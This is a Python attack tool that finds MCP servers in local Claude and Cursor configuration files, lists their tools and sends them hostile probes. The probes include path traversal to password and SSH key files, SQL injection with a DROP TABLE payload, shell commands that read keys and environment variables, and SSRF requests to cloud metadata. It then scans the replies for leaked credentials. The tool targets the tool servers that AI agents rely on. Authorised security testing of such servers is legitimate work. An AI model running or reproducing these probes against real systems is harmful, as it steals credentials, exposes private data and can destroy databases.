"""
MCP Server Enumerator & Information Leaker

Discovers MCP servers and attempts to extract sensitive information from them.

Requires: Python 3.12+
"""
from __future__ import annotations

import argparse
import json
import time
import sys
import os
from pathlib import Path
from dataclasses import dataclass, field
from typing import Any

import httpx

type JsonResponse = dict[str, Any] | str
type ProbeList = list[tuple[str, dict[str, str]]]


@dataclass(slots=True)
class Finding:
    severity: str
    category: str
    title: str
    details: str
    response: str = ""


@dataclass(slots=True)
class ServerInfo:
    url: str
    name: str = ""
    version: str = ""
    tools: list[dict] = field(default_factory=list)
    resources: list[dict] = field(default_factory=list)
    prompts: list[dict] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)


def jsonrpc(method: str, params: dict | None = None, *, req_id: int = 1) -> dict:
    msg: dict[str, Any] = {"jsonrpc": "2.0", "method": method, "id": req_id}
    if params:
        msg["params"] = params
    return msg


def send(url: str, payload: dict | list, headers: dict[str, str] | None = None) -> tuple[int, JsonResponse]:
    hdrs = {"Content-Type": "application/json", "User-Agent": "mcp-client/1.0"}
    if headers:
        hdrs |= headers
    try:
        with httpx.Client(timeout=15, verify=False) as client:
            r = client.post(url, json=payload, headers=hdrs)
            try:
                return r.status_code, r.json()
            except json.JSONDecodeError:
                return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


# ============================================================
# DISCOVERY
# ============================================================

CONFIG_PATHS = [
    Path.home() / ".claude.json",
    Path.home() / ".claude" / "settings.json",
    Path.home() / ".cursor" / "mcp.json",
    Path.home() / ".config" / "kiro" / "mcp.json",
    Path.cwd() / ".mcp.json",
    Path.cwd() / "mcp.json",
    Path.cwd() / ".cursor" / "mcp.json",
]


def discover_local_configs() -> list[dict[str, str]]:
    """Scan common MCP config locations."""
    configs: list[dict[str, str]] = []
    for path in CONFIG_PATHS:
        if not path.exists():
            continue
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
            for name, config in data.get("mcpServers", {}).items():
                match config:
                    case {"url": str(url), **_rest}:
                        configs.append({"name": name, "url": url, "source": str(path)})
                    case {"type": str(t), **_rest}:
                        configs.append({"name": name, "url": "", "type": t, "source": str(path)})
        except (json.JSONDecodeError, KeyError):
            pass
    return configs


# ============================================================
# ENUMERATION
# ============================================================

def enumerate_server(url: str) -> ServerInfo:
    """Full enumeration of an MCP server's capabilities."""
    info = ServerInfo(url=url)

    code, resp = send(url, jsonrpc("initialize", {
        "protocolVersion": "2025-06-18",
        "capabilities": {"tools": {}, "resources": {}, "prompts": {}},
        "clientInfo": {"name": "security-scanner", "version": "1.0.0"},
    }))

    if code != 200:
        info.errors.append(f"Initialize failed: {code}")
        return info

    match resp:
        case {"result": {"serverInfo": {"name": str(n), "version": str(v)}}}:
            info.name = n
            info.version = v
        case {"result": {"serverInfo": dict(si)}}:
            info.name = si.get("name", "")
            info.version = si.get("version", "")

    send(url, {"jsonrpc": "2.0", "method": "notifications/initialized"})

    _, resp = send(url, jsonrpc("tools/list"))
    match resp:
        case {"result": {"tools": list(tools)}}:
            info.tools = tools

    _, resp = send(url, jsonrpc("resources/list"))
    match resp:
        case {"result": {"resources": list(resources)}}:
            info.resources = resources

    _, resp = send(url, jsonrpc("prompts/list"))
    match resp:
        case {"result": {"prompts": list(prompts)}}:
            info.prompts = prompts

    return info


# ============================================================
# PROBE GENERATION
# ============================================================

SECRET_KEYS = [
    "aws", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
    "database", "db_password", "DB_CONNECTION_STRING",
    "api_key", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
    "admin", "root", "production",
    "private_key", "ssh_key", "tls_cert",
    "jwt_secret", "session_secret", "encryption_key",
    "../../../etc/passwd", "../../../../etc/shadow",
]

SQL_QUERIES = [
    "SELECT * FROM users LIMIT 10",
    "SELECT table_name FROM information_schema.tables",
    "SELECT * FROM pg_shadow",
    "SHOW DATABASES",
    "SELECT * FROM credentials",
    "SELECT * FROM secrets",
    "; DROP TABLE users; --",
]

FILE_PATHS = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "~/.ssh/id_rsa", "~/.ssh/authorized_keys",
    "~/.aws/credentials", "~/.aws/config",
    ".env", "../.env", "../../.env",
    "/proc/self/environ",
    "C:\\Users\\Administrator\\.ssh\\id_rsa",
    "../../../etc/passwd",
]

SHELL_COMMANDS = [
    "id", "whoami", "hostname", "env", "printenv",
    "cat /etc/passwd", "cat ~/.ssh/id_rsa", "cat .env",
    "ls -la /", "curl http://169.254.169.254/latest/meta-data/",
    "aws sts get-caller-identity",
]

SSRF_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:3000/api/config",
    "http://internal.service.local/secrets",
    "file:///etc/passwd",
]


def _first_field(properties: dict[str, Any], candidates: list[str]) -> str:
    """Get the first matching field name from schema properties."""
    for c in candidates:
        if c in properties:
            return c
    return next(iter(properties), "input")


def generate_probes(tool_name: str, properties: dict[str, Any]) -> ProbeList:
    """Generate targeted probes based on tool name and schema."""
    probes: ProbeList = []
    name = tool_name.lower()

    match name:
        case n if any(k in n for k in ("secret", "vault", "credential", "key", "token", "password", "config")):
            field = _first_field(properties, ["key", "name", "id", "path", "secret_name"])
            probes.extend((f"secret/{k}", {field: k}) for k in SECRET_KEYS)

        case n if any(k in n for k in ("db", "query", "sql", "database", "postgres", "mysql", "mongo")):
            field = _first_field(properties, ["sql", "query", "statement", "command"])
            probes.extend((f"sql/{q[:25]}", {field: q}) for q in SQL_QUERIES)

        case n if any(k in n for k in ("file", "read", "fs", "filesystem", "path", "document")):
            field = _first_field(properties, ["path", "file", "filename", "filepath"])
            probes.extend((f"file/{p}", {field: p}) for p in FILE_PATHS)

        case n if any(k in n for k in ("shell", "exec", "command", "run", "terminal", "bash", "cmd")):
            field = _first_field(properties, ["command", "cmd", "script", "code"])
            probes.extend((f"cmd/{c[:15]}", {field: c}) for c in SHELL_COMMANDS)

        case n if any(k in n for k in ("http", "fetch", "url", "request", "web", "curl", "api")):
            field = _first_field(properties, ["url", "endpoint", "uri", "target"])
            probes.extend((f"ssrf/{u[:25]}", {field: u}) for u in SSRF_URLS)

        case _:
            if properties:
                field = next(iter(properties))
                probes.extend([
                    ("generic/test", {field: "test"}),
                    ("generic/admin", {field: "admin"}),
                    ("generic/env", {field: "../../../.env"}),
                ])

    return probes


# ============================================================
# RESPONSE ANALYSIS
# ============================================================

CREDENTIAL_PATTERNS = ["AKIA", "sk-", "ghp_", "glpat-", "xoxb-", "xoxp-", "-----BEGIN"]
SYSTEM_PATTERNS = ["root:x:0:0", "/bin/bash", "/bin/sh", "daemon:x:"]
DB_PATTERNS = ["table_name", "information_schema", "pg_shadow", "pg_catalog"]
CLOUD_PATTERNS = ["ami-id", "instance-id", "security-credentials", "iam"]
ENV_PATTERNS = ["AWS_", "OPENAI_", "DATABASE_URL", "SECRET_KEY", "API_KEY", "ANTHROPIC_"]
CONN_PATTERNS = ["postgres://", "mysql://", "mongodb://", "redis://", "amqp://"]


def analyze_response(tool_name: str, probe_name: str, args: dict, text: str) -> Finding | None:
    """Analyze a tool response for sensitive information."""
    match text:
        case t if any(p in t for p in CREDENTIAL_PATTERNS):
            return Finding("critical", "credential_leak", f"Credential material in {tool_name}",
                          f"Probe: {probe_name}", t[:500])

        case t if any(p in t for p in SYSTEM_PATTERNS):
            return Finding("high", "system_info", f"System file contents from {tool_name}",
                          f"Probe: {probe_name}", t[:500])

        case t if any(p in t for p in DB_PATTERNS):
            return Finding("high", "data_leak", f"Database schema exposed via {tool_name}",
                          f"Probe: {probe_name}", t[:500])

        case t if any(p in t for p in CLOUD_PATTERNS):
            return Finding("critical", "ssrf", f"Cloud metadata accessible via {tool_name}",
                          f"Probe: {probe_name}", t[:500])

        case t if any(p in t for p in ENV_PATTERNS):
            return Finding("high", "env_leak", f"Environment variables exposed via {tool_name}",
                          f"Probe: {probe_name}", t[:500])

        case t if any(p in t.lower() for p in CONN_PATTERNS):
            return Finding("high", "connection_string", f"Connection string from {tool_name}",
                          f"Probe: {probe_name}", t[:500])

        case t if len(t) > 50 and not any(x in t.lower() for x in ("denied", "error", "not found", "forbidden")):
            return Finding("low", "info_disclosure", f"Non-trivial response from {tool_name}",
                          f"Probe: {probe_name}", t[:300])

        case _:
            return None


# ============================================================
# LEAK EXECUTION
# ============================================================

def leak_secrets(url: str, tools: list[dict]) -> list[Finding]:
    """Probe all tools for information disclosure."""
    findings: list[Finding] = []

    for tool in tools:
        name = tool.get("name", "")
        properties = tool.get("inputSchema", {}).get("properties", {})
        probes = generate_probes(name, properties)

        for probe_name, args in probes:
            code, resp = send(url, jsonrpc("tools/call", {"name": name, "arguments": args}))

            match resp:
                case {"result": {"content": list(content), "isError": False | None}} | {"result": {"content": list(content)}} if not resp.get("result", {}).get("isError"):
                    for item in content:
                        if (text := item.get("text", "")) and text:
                            if finding := analyze_response(name, probe_name, args, text):
                                findings.append(finding)
                case _:
                    pass

            time.sleep(0.5)

    return findings


# ============================================================
# MAIN
# ============================================================

def main() -> int:
    parser = argparse.ArgumentParser(description="MCP Server Enumerator & Information Leaker")
    parser.add_argument("--url", help="Target MCP server URL")
    parser.add_argument("--discover", action="store_true", help="Discover MCP servers from local configs")
    parser.add_argument("--deep", action="store_true", help="Run deep probing (more aggressive)")
    args = parser.parse_args()

    print("=" * 70)
    print("  MCP SERVER ENUMERATOR & INFORMATION LEAKER")
    print("  Python 3.12+ | github.com/Jake-Schoellkopf/aicu-agent")
    print("=" * 70)

    targets: list[str] = []

    if args.discover:
        print("\n  [DISCOVERY] Scanning local MCP configs...")
        configs = discover_local_configs()
        for c in configs:
            print(f"    Found: {c['name']} -> {c.get('url', c.get('type', '?'))} ({c['source']})")
            if url := c.get("url"):
                targets.append(url)
        if not configs:
            print("    No MCP configs found.")

    if args.url:
        targets.append(args.url)

    if not targets:
        print("\n  No targets. Use --url or --discover.")
        return 1

    all_findings: list[Finding] = []

    for url in targets:
        print(f"\n\n  [TARGET] {url}")
        print("  " + "=" * 60)

        print("\n  [ENUM] Enumerating server...")
        info = enumerate_server(url)

        if info.name:
            print(f"    Server: {info.name} v{info.version}")
        print(f"    Tools: {len(info.tools)}")
        for t in info.tools:
            print(f"      - {t['name']}: {t.get('description', '')[:55]}")
        if info.resources:
            print(f"    Resources: {len(info.resources)}")
        if info.prompts:
            print(f"    Prompts: {len(info.prompts)}")

        if info.tools:
            print(f"\n  [LEAK] Probing {len(info.tools)} tools...")
            findings = leak_secrets(url, info.tools)
            all_findings.extend(findings)

            for f in findings:
                icon = {"critical": "\U0001f534", "high": "\U0001f7e0", "medium": "\U0001f7e1", "low": "\U0001f535"}.get(f.severity, "?")
                print(f"\n    {icon} [{f.severity.upper()}] {f.title}")
                print(f"       {f.details}")
                if f.response:
                    print(f"       Response: {f.response[:150]}")

    # Summary
    print(f"\n\n{'=' * 70}")
    print(f"  SUMMARY")
    print(f"{'=' * 70}")
    print(f"  Targets: {len(targets)} | Findings: {len(all_findings)}")
    for sev in ("critical", "high", "medium", "low"):
        count = sum(1 for f in all_findings if f.severity == sev)
        if count:
            print(f"    {sev.upper()}: {count}")
    if not all_findings:
        print(f"  No sensitive data leaked.")
    print(f"{'=' * 70}")

    return 1 if any(f.severity in ("critical", "high") for f in all_findings) else 0


if __name__ == "__main__":
    sys.exit(main())
